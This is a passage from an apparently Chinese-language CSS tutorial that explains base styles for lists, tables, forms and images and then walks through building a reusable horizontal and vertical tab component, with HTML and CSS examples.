<li>line-height</li>
<li>margin-bottom</li>
<li>margin-top</li>
<li>padding-left</li>
</ul>
<p>为了防止子元素的缩进，<code>&lt;ol&gt; 或 &lt;ul&gt;</code> 元素的 padding-left 属性值应该设置为 0。子元素 <code>&lt;li&gt;</code> 从父元素<code>&lt;ol&gt;或 &lt;ul&gt;</code>继承 font-family、font-size 和 line-height 属性，但是不继承 margin 或 padding 属性。</p>
<h4 id="4-2-8-组合元素"><a href="#4-2-8-组合元素" class="headerlink" title="4.2.8 组合元素"></a>4.2.8 组合元素</h4><p>组合元素（grouping element）包括 <code>&lt;div&gt;、&lt;main&gt; 和 &lt;span&gt;</code>。通常没必要为其定义基础样式，它们的样式根据具体情况用类来定义。然而，如果<code>&lt;main&gt;</code>标签用作可见的容器，最好为其设置 margin 和 padding 属性。</p>
<h4 id="4-2-9-表格"><a href="#4-2-9-表格" class="headerlink" title="4.2.9 表格"></a>4.2.9 表格</h4><p>需要用到的元素包括 <code>&lt;table&gt;、&lt;caption&gt;、&lt;colgroup&gt;、&lt;col&gt;（列）、&lt;tbody&gt;（表格主体）、&lt;thead&gt;（表头）、&lt;tfoot&gt;（表格的页脚）、&lt;tr&gt;（表格行）、&lt;td&gt;（表格单元格）和 &lt;th&gt;（表头单元格）元素</code>。</p>
<p>为<code>&lt;table&gt;</code>元素定义基础样式时，需要考虑以下属性：</p>
<ul>
<li>border-collapse</li>
<li>border-spacing</li>
<li>border(border-width、border-color 和 border-style)</li>
<li>empty-cells</li>
<li>font-family</li>
<li>font-size</li>
<li>letter-spacing</li>
<li>line-height</li>
</ul>
<p>为 <code>&lt;thead&gt;、&lt;tbody&gt; 和 &lt;tfoot&gt;</code> 元素定义基础样式时，需要考虑以下属性：</p>
<ul>
<li>background-color</li>
<li>color</li>
<li>text-align</li>
<li>vertical-align</li>
</ul>
<p>为 <code>&lt;th&gt; 和 &lt;td&gt;</code> 元素定义基础样式时，需要考虑以下属性：</p>
<ul>
<li>background-color</li>
<li>border（border-width、border-color 和 border-style）</li>
<li>color</li>
<li>font-family</li>
<li>font-size</li>
<li>letter-spacing</li>
<li>line-height</li>
<li>text-align</li>
<li>vertical-align</li>
</ul>
<p>综上，也许应该为表格定义类似如下样式：</p>
<figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="selector-tag">table</span> &#123;</span><br><span class="line">  <span class="attribute">border-collapse</span>: collapse;</span><br><span class="line">  <span class="attribute">border-spacing</span>: <span class="number">0</span>;</span><br><span class="line">  <span class="attribute">empty-cells</span>: show;</span><br><span class="line">  <span class="attribute">border</span>: <span class="number">1px</span> solid <span class="number">#000000</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="selector-tag">tfoot</span>,</span><br><span class="line"><span class="selector-tag">thead</span> &#123;</span><br><span class="line">  <span class="attribute">text-align</span>: left;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="selector-tag">thead</span> &#123;</span><br><span class="line">  <span class="attribute">background-color</span>: <span class="number">#acacac</span>;</span><br><span class="line">  <span class="attribute">color</span>: <span class="number">#000000</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="selector-tag">th</span>,</span><br><span class="line"><span class="selector-tag">td</span> &#123;</span><br><span class="line">  <span class="attribute">border-left</span>: <span class="number">1px</span> solid <span class="number">#000000</span>;</span><br><span class="line">  <span class="attribute">padding</span>: <span class="number">0.5em</span> <span class="number">1em</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="selector-tag">th</span><span class="selector-pseudo">:first</span>-child,</span><br><span class="line"><span class="selector-tag">td</span>: first-child &#123;</span><br><span class="line">  <span class="attribute">border-left</span>: none;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="4-2-10-表单"><a href="#4-2-10-表单" class="headerlink" title="4.2.10 表单"></a>4.2.10 表单</h4><p>表单元素包括<code>&lt;form&gt;、&lt;label&gt;、&lt;input&gt;、&lt;button&gt;、&lt;select&gt;、&lt;datalist&gt;、&lt;optgroup&gt;、&lt;option&gt;、&lt;textarea&gt;、&lt;output&gt;、&lt;progress&gt;、&lt;meter&gt;、&lt;fifieldset&gt; 和 &lt;legend&gt;</code>。为该类元素定义基础样式时，应考虑以下属性：</p>
<ul>
<li>font-family</li>
<li>font-size</li>
<li>line-height</li>
<li>margin</li>
<li>padding</li>
</ul>
<p>子元素 <code>&lt;legend&gt;、&lt;label&gt; 和 &lt;input&gt;</code> 的 font-weight、font-size 和 font-family 属性通常不同于父元素<code>&lt;form&gt;</code>，因此应该在子元素上定义这三个属性。</p>
<p>有一些表单元素，我们很难为其添加样式，因为很多浏览器会忽略应用于它们的属性。例如，浏览器会忽略为复选框和单选按钮的 border-color、border-width、background-color 和许多其他属性定义的样式。解决办法是，自定义复选框和单选按钮组件，隐藏表单的控制控件，并使用其他 HTML 元素实现按钮效果，但这不是基础样式所要实现的。</p>
<p>为表单元素定义以下样式，也许比较合理：</p>
<figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="selector-tag">fieldset</span> &#123;</span><br><span class="line">  <span class="attribute">border</span>: <span class="number">0</span>;</span><br><span class="line">  <span class="attribute">margin</span>: <span class="number">0</span>;</span><br><span class="line">  <span class="attribute">padding</span>: <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="selector-tag">input</span> &#123;</span><br><span class="line">  <span class="attribute">display</span>: block;</span><br><span class="line">  <span class="attribute">font-size</span>: inherit;</span><br><span class="line">  <span class="attribute">padding</span>: <span class="number">4px</span>;</span><br><span class="line">  <span class="attribute">width</span>: <span class="number">100%</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="selector-tag">label</span> &#123;</span><br><span class="line">  <span class="attribute">display</span>: block;</span><br><span class="line">  <span class="attribute">font-weight</span>: <span class="number">900</span>;</span><br><span class="line">  <span class="attribute">margin-bottom</span>: <span class="number">6px</span>;</span><br><span class="line">  <span class="attribute">padding</span>: <span class="number">4px</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="selector-tag">legend</span> &#123;</span><br><span class="line">  <span class="attribute">border</span>: <span class="number">0</span>;</span><br><span class="line">  <span class="attribute">color</span>: <span class="number">#000000</span>;</span><br><span class="line">  <span class="attribute">display</span>: block;</span><br><span class="line">  <span class="attribute">font-size</span>: <span class="number">1.2em</span>;</span><br><span class="line">  <span class="attribute">margin-bottom</span>: <span class="number">12px</span>;</span><br><span class="line">  <span class="attribute">padding</span>: <span class="number">0</span> <span class="number">12px</span>;</span><br><span class="line">  <span class="attribute">width</span>: <span class="number">100%</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="4-2-11-图像"><a href="#4-2-11-图像" class="headerlink" title="4.2.11 图像"></a>4.2.11 图像</h4><p>图像可以用 <code>&lt;img&gt; 或 &lt;picture&gt;</code> 标签展示。为图像元素定义基础样式时，应该考虑如下属性：</p>
<ul>
<li>border</li>
<li>max-width</li>
<li>vertical-align</li>
</ul>
<p>当 <code>&lt;img&gt;</code> 元素置于设置了大小的块状元素之中时，将 max-width 属性设置为父容器的 100%，能够防止图像溢出容器。</p>
<p>示例</p>
<figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="selector-tag">img</span> &#123;</span><br><span class="line">  <span class="attribute">border</span>: none;</span><br><span class="line">  <span class="attribute">max-width</span>: <span class="number">100%</span>;</span><br><span class="line">  <span class="attribute">vertical-align</span>: middle;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="4-3-组件样式"><a href="#4-3-组件样式" class="headerlink" title="4.3 组件样式"></a>4.3 组件样式</h3><p>可复用组件是指添加了样式的元素或元素组合利用视觉隐喻，使得用户与网站的交互更加容易。</p>
<h4 id="4-3-1-定义需要实现的行为"><a href="#4-3-1-定义需要实现的行为" class="headerlink" title="4.3.1 定义需要实现的行为"></a>4.3.1 定义需要实现的行为</h4><p>创建可复用组件之前，思考以下问题将对你很有帮助。</p>
<ul>
<li><p>只有一个组件，还是有一个以上的组件组合在一起？</p>
</li>
<li><p>组件是行内元素、块状元素还是其他类型（例如：组件以绝对定位的方式独立于文档</p>
<p>流吗）？</p>
</li>
</ul>
<p>创建可复用组件的过程可以简化如下：</p>
<p>(1) 创建组件之前，定义需要实现的行为。</p>
<p>(2) 保持组件样式的粒度，设置合理的默认值。</p>
<p>(3) 若需要重写组件组的可见样式，用容器元素将它们包起来，为该容器定义一个具有区别</p>
<p>度的类。</p>
<p>(4) 将定义元素尺寸的任务交给结构化容器。</p>
<p>示例：构建一个简单的选项卡组件</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">nav</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">ul</span> <span class="attr">class</span>=<span class="string">&quot;tab-group&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">li</span> <span class="attr">class</span>=<span class="string">&quot;tab active&quot;</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;#&quot;</span>&gt;</span>Tab One<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">li</span> <span class="attr">class</span>=<span class="string">&quot;tab&quot;</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;#&quot;</span>&gt;</span>Tab Two<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">li</span> <span class="attr">class</span>=<span class="string">&quot;tab&quot;</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;#&quot;</span>&gt;</span>Tab Three<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">ul</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">nav</span>&gt;</span></span><br></pre></td></tr></table></figure>

<h4 id="4-3-2-保持组件样式的粒度"><a href="#4-3-2-保持组件样式的粒度" class="headerlink" title="4.3.2 保持组件样式的粒度"></a>4.3.2 保持组件样式的粒度</h4><figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Tab Component Styles</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="selector-class">.tab</span> &#123;</span><br><span class="line">  <span class="attribute">background-color</span>: <span class="number">#f2f2f2</span>;</span><br><span class="line">  <span class="attribute">border-bottom</span>: <span class="number">1px</span> solid <span class="number">#eeeeee</span>;</span><br><span class="line">  <span class="attribute">border-top</span>: <span class="number">1px</span> solid <span class="number">#eeeeee</span>;</span><br><span class="line">  <span class="attribute">bottom</span>: -<span class="number">1px</span>;</span><br><span class="line">  <span class="attribute">display</span>: inline-block;</span><br><span class="line">  <span class="attribute">margin-left</span>: <span class="number">0</span>;</span><br><span class="line">  <span class="attribute">margin-right</span>: <span class="number">0</span>;</span><br><span class="line">  <span class="attribute">margin-top</span>: <span class="number">4px</span>;</span><br><span class="line">  <span class="attribute">position</span>: relative;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="selector-class">.tab</span><span class="selector-pseudo">:first</span>-child &#123;</span><br><span class="line">  <span class="attribute">border-left</span>: <span class="number">1px</span> solid <span class="number">#eeeeee</span>;</span><br><span class="line">  <span class="attribute">border-top-left-radius</span>: <span class="number">4px</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="selector-class">.tab</span><span class="selector-pseudo">:last-child</span> &#123;</span><br><span class="line">  <span class="attribute">border-right</span>: <span class="number">1px</span> solid <span class="number">#eeeeee</span>;</span><br><span class="line">  <span class="attribute">border-top-right-radius</span>: <span class="number">4px</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="selector-class">.tab</span><span class="selector-class">.active</span> &#123;</span><br><span class="line">  <span class="attribute">background-color</span>: <span class="number">#ffffff</span>;</span><br><span class="line">  <span class="attribute">border-bottom</span>: <span class="number">1px</span> solid <span class="number">#2196f3</span>;</span><br><span class="line">  <span class="attribute">color</span>: <span class="number">#000000</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="selector-class">.tab</span><span class="selector-pseudo">:hover</span> &#123;</span><br><span class="line">  <span class="attribute">background-color</span>: <span class="number">#f9f9f9</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="selector-class">.tab</span> &gt; <span class="selector-tag">a</span> &#123;</span><br><span class="line">  <span class="attribute">color</span>: inherit;</span><br><span class="line">  <span class="attribute">display</span>: block;</span><br><span class="line">  <span class="attribute">height</span>: <span class="number">100%</span>;</span><br><span class="line">  <span class="attribute">padding</span>: <span class="number">12px</span>;</span><br><span class="line">  <span class="attribute">text-decoration</span>: none;</span><br><span class="line">  <span class="attribute">width</span>: <span class="number">100%</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Tab Component Containers</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="selector-class">.tab-group</span> &#123;</span><br><span class="line">  <span class="attribute">border-bottom</span>: <span class="number">1px</span> solid <span class="number">#eeeeee</span>;</span><br><span class="line">  <span class="attribute">list-style</span>: none;</span><br><span class="line">  <span class="attribute">margin</span>: <span class="number">0</span>;</span><br><span class="line">  <span class="attribute">padding-left</span>: <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="4-3-3-根据需要，改写元素容器的样式"><a href="#4-3-3-根据需要，改写元素容器的样式" class="headerlink" title="4.3.3 根据需要，改写元素容器的样式"></a>4.3.3 根据需要，改写元素容器的样式</h4><figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Horizontal Tab Groups</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="selector-class">.tab-group</span> &#123;</span><br><span class="line">  <span class="attribute">border-bottom</span>: <span class="number">1px</span> solid <span class="number">#eeeeee</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="selector-class">.tab-group</span> <span class="selector-class">.tab</span> &#123;</span><br><span class="line">  <span class="attribute">border-bottom</span>: <span class="number">1px</span> solid <span class="number">#eeeeee</span>;</span><br><span class="line">  <span class="attribute">border-top</span>: <span class="number">1px</span> solid <span class="number">#eeeeee</span>;</span><br><span class="line">  <span class="attribute">bottom</span>: -<span class="number">1px</span>;</span><br><span class="line">  <span class="attribute">display</span>: inline-block;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="selector-class">.tab-group</span> <span class="selector-class">.tab</span><span class="selector-pseudo">:first</span>-child &#123;</span><br><span class="line">  <span class="attribute">border-left</span>: <span class="number">1px</span> solid <span class="number">#eeeeee</span>;</span><br><span class="line">  <span class="attribute">border-top-left-radius</span>: <span class="number">4px</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="selector-class">.tab-group</span> <span class="selector-class">.tab</span><span class="selector-pseudo">:last-child</span> &#123;</span><br><span class="line">  <span class="attribute">border-right</span>: <span class="number">1px</span> solid <span class="number">#eeeeee</span>;</span><br><span class="line">  <span class="attribute">border-top-right-radius</span>: <span class="number">4px</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="selector-class">.tab-group</span> <span class="selector-class">.tab</span><span class="selector-class">.active</span> &#123;</span><br><span class="line">  <span class="attribute">border-bottom</span>: <span class="number">1px</span> solid <span class="number">#2196f3</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Vertical Tab Groups</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="selector-class">.tab-group-vertical</span> &#123;</span><br><span class="line">  <span class="attribute">border-left</span>: <span class="number">1px</span> solid <span class="number">#eeeeee</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="selector-class">.tab-group-vertical</span> <span class="selector-class">.tab</span> &#123;</span><br><span class="line">  <span class="attribute">border-left</span>: <span class="number">1px</span> solid <span class="number">#eeeeee</span>;</span><br><span class="line">  <span class="attribute">border-right</span>: <span class="number">1px</span> solid <span class="number">#eeeeee</span>;</span><br><span class="line">  <span class="attribute">left</span>: -<span class="number">1px</span>;</span><br><span class="line">  <span class="attribute">display</span>: block;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="selector-class">.tab-group-vertical</span> <span class="selector-class">.tab</span><span class="selector-pseudo">:first</span>-child &#123;</span><br><span class="line">  <span class="attribute">border-top</span>: <span class="number">1px</span> solid <span class="number">#eeeeee</span>;</span><br><span class="line">  <span class="attribute">border-top-right-radius</span>: <span class="number">4px</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="selector-class">.tab-group-vertical</span> <span class="selector-class">.tab</span><span class="selector-pseudo">:last-child</span> &#123;</span><br><span class="line">  <span class="attribute">border-bottom</span>: <span class="number">1px</span> solid <span class="number">#eeeeee</span>;</span><br><span class="line">  <span class="attribute">border-bottom-right-radius</span>: <span class="number">4px</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="selector-class">.tab-group-vertical</span> <span class="selector-class">.tab</span><span class="selector-class">.active</span> &#123;</span><br><span class="line">  <span class="attribute">border-left</span>: <span class="number">1px</span> solid <span class="number">#2196f3</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="4-3-4-将尺寸的定义交由结构化容器"><a href="#4-3-4-将尺寸的定义交由结构化容器" class="headerlink" title="4.3.4 将尺寸的定义交由结构化容器"></a>4.3.4 将尺寸的定义交由结构化容器</h4><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>Example: Vertical Tabs<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">style</span> <span class="attr">type</span>=<span class="string">&quot;text/css&quot;</span>&gt;</span><span class="language-css"></span></span><br><span class="line"><span class="language-css">      *,</span></span><br><span class="line"><span class="language-css">      *<span class="selector-pseudo">:after</span>,</span></span><br><span class="line"><span class="language-css">      *<span class="selector-pseudo">:before</span> &#123;</span></span><br><span class="line"><span class="language-css">        <span class="attribute">box-sizing</span>: border-box;</span></span><br><span class="line"><span class="language-css">      &#125;</span></span><br><span class="line"><span class="language-css"></span></span><br><span class="line"><span class="language-css">      <span class="selector-tag">body</span> &#123;</span></span><br><span class="line"><span class="language-css">        <span class="attribute">margin</span>: <span class="number">0</span>;</span></span><br><span class="line"><span class="language-css">        <span class="attribute">padding</span>: <span class="number">0</span>;</span></span><br><span class="line"><span class="language-css">      &#125;</span></span><br><span class="line"><span class="language-css"></span></span><br><span class="line"><span class="language-css">      <span class="comment">/**</span></span></span><br><span class="line"><span class="comment"><span class="language-css">       * Tab Component Styles</span></span></span><br><span class="line"><span class="comment"><span class="language-css">       */</span></span></span><br><span class="line"><span class="language-css"></span></span><br><span class="line"><span class="language-css">      <span class="selector-class">.tab</span> &#123;</span></span><br><span class="line"><span class="language-css">        <span class="attribute">background-color</span>: <span class="number">#f2f2f2</span>;</span></span><br><span class="line"><span class="language-css">        <span class="attribute">margin-left</span>: <span class="number">0</span>;</span></span><br><span class="line"><span class="language-css">        <span class="attribute">margin-right</span>: <span class="number">0</span>;</span></span><br><span class="line"><span class="language-css">        <span class="attribute">position</span>: relative;</span></span><br><span class="line"><span class="language-css">      &#125;</span></span><br><span class="line"><span class="language-css"></span></span><br><span class="line"><span class="language-css">      <span class="selector-class">.tab</span><span class="selector-pseudo">:hover</span> &#123;</span></span><br><span class="line"><span class="language-css">        <span class="attribute">background-color</span>: <span class="number">#f9f9f9</span>;</span></span><br><span class="line"><span class="language-css">      &#125;</span></span><br><span class="line"><span class="language-css"></span></span><br><span class="line"><span class="language-css">      <span class="selector-class">.tab</span><span class="selector-class">.active</span> &#123;</span></span><br><span class="line"><span class="language-css">        <span class="attribute">background-color</span>: <span class="number">#ffffff</span>;</span></span><br><span class="line"><span class="language-css">        <span class="attribute">color</span>: <span class="number">#000000</span>;</span></span><br><span class="line"><span class="language-css">      &#125;</span></span><br><span class="line"><span class="language-css"></span></span><br><span class="line"><span class="language-css">      <span class="selector-class">.tab</span> &gt; <span class="selector-tag">a</span> &#123;</span></span><br><span class="line"><span class="language-css">        <span class="attribute">color</span>: inherit;</span></span><br><span class="line"><span class="language-css">        <span class="attribute">display</span>: block;</span></span><br><span class="line"><span class="language-css">        <span class="attribute">height</span>: <span class="number">100%</span>;</span></span><br><span class="line"><span class="language-css">        <span class="attribute">padding</span>: <span class="number">12px</span>;</span></span><br><span class="line"><span class="language-css">        <span class="attribute">text-decoration</span>: none;</span></span><br><span class="line"><span class="language-css">        <span class="attribute">width</span>: <span class="number">100%</span>;</span></span><br><span class="line"><span class="language-css">      &#125;</span></span><br><span class="line"><span class="language-css"></span></span><br><span class="line"><span class="language-css">      <span class="comment">/**</span></span></span><br><span class="line"><span class="comment"><span class="language-css">       * Tab Component Containers</span></span></span><br><span class="line"><span class="comment"><span class="language-css">       */</span></span></span><br><span class="line"><span class="language-css"></span></span><br><span class="line"><span class="language-css">      <span class="selector-class">.tab-group</span>,</span></span><br><span class="line"><span class="language-css">      <span class="selector-class">.tab-group-vertical</span> &#123;</span></span><br><span class="line"><span class="language-css">        <span class="attribute">list-style</span>: none;</span></span><br><span class="line"><span class="language-css">        <span class="attribute">margin</span>: <span class="number">0</span>;</span></span><br><span class="line"><span class="language-css">        <span class="attribute">padding-left</span>: <span class="number">0</span>;</span></span><br><span class="line"><span class="language-css">      &#125;</span></span><br><span class="line"><span class="language-css"></span></span><br><span class="line"><span class="language-css">      <span class="selector-class">.tab</span>,</span></span><br><span class="line"><span class="language-css">      <span class="selector-class">.tab-group</span>,</span></span><br><span class="line"><span class="language-css">      <span class="selector-class">.tab-group-vertical</span> &#123;</span></span><br><span class="line"><span class="language-css">        <span class="attribute">border-color</span>: <span class="number">#eeeeee</span>;</span></span><br><span class="line"><span class="language-css">        <span class="attribute">border-style</span>: solid;</span></span><br><span class="line"><span class="language-css">        <span class="attribute">border-width</span>: <span class="number">0</span>;</span></span><br><span class="line"><span class="language-css">      &#125;</span></span><br><span class="line"><span class="language-css"></span></span><br><span class="line"><span class="language-css">      <span class="comment">/**</span></span></span><br><span class="line"><span class="comment"><span class="language-css">       * Horizontal Tab Groups</span></span></span><br><span class="line"><span class="comment"><span class="language-css">       */</span></span></span><br><span class="line"><span class="language-css"></span></span><br><span class="line"><span class="language-css">      <span class="selector-class">.tab-group</span> &#123;</span></span><br><span class="line"><span class="language-css">        <span class="attribute">border-bottom-width</span>: <span class="number">1px</span>;</span></span><br><span class="line"><span class="language-css">      &#125;</span></span><br><span class="line"><span class="language-css"></span></span><br><span class="line"><span class="language-css">      <span class="selector-class">.tab-group</span> <span class="selector-class">.tab</span> &#123;</span></span><br><span class="line"><span class="language-css">        <span class="attribute">border-bottom-width</span>: <span class="number">1px</span>;</span></span><br><span class="line"><span class="language-css">        <span class="attribute">border-top-width</span>: <span class="number">1px</span>;</span></span><br><span class="line"><span class="language-css">        <span class="attribute">bottom</span>: -<span class="number">1px</span>;</span></span><br><span class="line"><span class="language-css">        <span class="attribute">display</span>: inline-block;</span></span><br><span class="line"><span class="language-css">      &#125;</span></span><br><span class="line"><span class="language-css"></span></span><br><span class="line"><span class="language-css">      <span class="selector-class">.tab-group</span> <span class="selector-class">.tab</span><span class="selector-pseudo">:first</span>-child &#123;</span></span><br><span class="line"><span class="language-css">        <span class="attribute">border-left-width</span>: <span class="number">1px</span>;</span></span><br><span class="line"><span class="language-css">        <span class="attribute">border-top-left-radius</span>: <span class="number">4px</span>;</span></span><br><span class="line"><span class="language-css">      &#125;</span></span><br><span class="line"><span class="language-css"></span></span><br><span class="line"><span class="language-css">      <span class="selector-class">.tab-group</span> <span class="selector-class">.tab</span><span class="selector-pseudo">:last-child</span> &#123;</span></span><br><span class="line"><span class="language-css">        <span class="attribute">border-right-width</span>: <span class="number">1px</span>;</span></span><br><span class="line"><span class="language-css">        <span class="attribute">border-top-right-radius</span>: <span class="number">4px</span>;</span></span><br><span class="line"><span class="language-css">      &#125;</span></span><br><span class="line"><span class="language-css"></span></span><br><span class="line"><span class="language-css">      <span class="selector-class">.tab-group</span> <span class="selector-class">.tab</span><span class="selector-class">.active</span> &#123;</span></span><br><span class="line"><span class="language-css">        <span class="attribute">border-bottom-color</span>: <span class="number">#2196f3</span>;</span></span><br><span class="line"><span class="language-css">        <span class="attribute">border-bottom-width</span>: <span class="number">1px</span>;</span></span><br><span class="line"><span class="language-css">      &#125;</span></span><br><span class="line"><span class="language-css"></span></span><br><span class="line"><span class="language-css">      <span class="comment">/**</span></span></span><br><span class="line"><span class="comment"><span class="language-css">       * Vertical Tab Groups</span></span></span><br><span class="line"><span class="comment"><span class="language-css">       */</span></span></span><br><span class="line"><span class="language-css"></span></span><br><span class="line"><span class="language-css">      <span class="selector-class">.tab-group-vertical</span> &#123;</span></span><br><span class="line"><span class="language-css">        <span class="attribute">border-left-width</span>: <span class="number">1px</span>;</span></span><br><span class="line"><span class="language-css">      &#125;</span></span><br><span class="line"><span class="language-css"></span></span><br><span class="line"><span class="language-css">      <span class="selector-class">.tab-group-vertical</span> <span class="selector-class">.tab</span> &#123;</span></span><br><span class="line"><span class="language-css">        <span class="attribute">border-left-width</span>: <span class="number">1px</span>;</span></span><br><span class="line"><span class="language-css">        <span class="attribute">border-right-width</span>: <span class="number">1px</span>;</span></span><br><span class="line"><span class="language-css">        <span class="attribute">left</span>: -<span class="number">1px</span>;</span></span><br><span class="line"><span class="language-css">        <span class="attribute">display</span>: block;</span></span><br><span class="line"><span class="language-css">      &#125;</span></span><br><span class="line"><span class="language-css"></span></span><br><span class="line"><span class="language-css">      <span class="selector-class">.tab-group-vertical</span> <span class="selector-class">.tab</span><span class="selector-pseudo">:first</span>-child &#123;</span></span><br><span class="line"><span class="language-css">        <span class="attribute">border-top-width</span>: <span class="number">1px</span>;</span></span><br><span class="line"><span class="language-css">        <span class="attribute">border-top-right-radius</span>: <span class="number">4px</span>;</span></span><br><span class="line"><span class="language-css">      &#125;</span></span><br><span class="line"><span class="language-css"></span></span><br><span class="line"><span class="language-css">      <span class="selector-class">.tab-group-vertical</span> <span class="selector-class">.tab</span><span class="selector-pseudo">:last-child</span> &#123;</span></span><br><span class="line"><span class="language-css">        <span class="attribute">border-bottom-width</span>: <span class="number">1px</span>;</span></span><br><span class="line"><span class="language-css">        <span class="attribute">border-bottom-right-radius</span>: <span class="number">4px</span>;</span></span><br><span class="line"><span class="language-css">      &#125;</span></span><br><span class="line"><span class="language-css"></span></span><br><span class="line"><span class="language-css">      <span class="selector-class">.tab-group-vertical</span> <span class="selector-class">.tab</span><span class="selector-class">.active</span> &#123;</span></span><br><span class="line"><span class="language-css">        <span class="attribute">border-left-color</span>: <span class="number">#2196f3</span>;</span></span><br><span class="line"><span class="language-css">        <span class="attribute">border-left-width</span>: <span class="number">1px</span>;</span></span><br><span class="line"><span class="language-css">      &#125;</span></span><br><span class="line"><span class="language-css"></span></span><br><span class="line"><span class="language-css">      <span class="selector-class">.tabbed-pane</span> &#123;</span></span><br><span class="line"><span class="language-css">        <span class="attribute">margin</span>: <span class="number">200px</span>;</span></span><br><span class="line"><span class="language-css">      &#125;</span></span><br><span class="line"><span class="language-css">    </span><span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">nav</span> <span class="attr">class</span>=<span class="string">&quot;tabbed-pane&quot;</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">ul</span> <span class="attr">class</span>=<span class="string">&quot;tab-group-vertical&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">li</span> <span class="attr">class</span>=<span class="string">&quot;tab active&quot;</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;#&quot;</span>&gt;</span>Tab One<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">li</span> <span class="attr">class</span>=<span class="string">&quot;tab&quot;</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;#&quot;</span>&gt;</span>Tab Two<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">li</span> <span class="attr">class</span>=<span class="string">&quot;tab&quot;</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;#&quot;</span>&gt;</span>Tab Three<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span 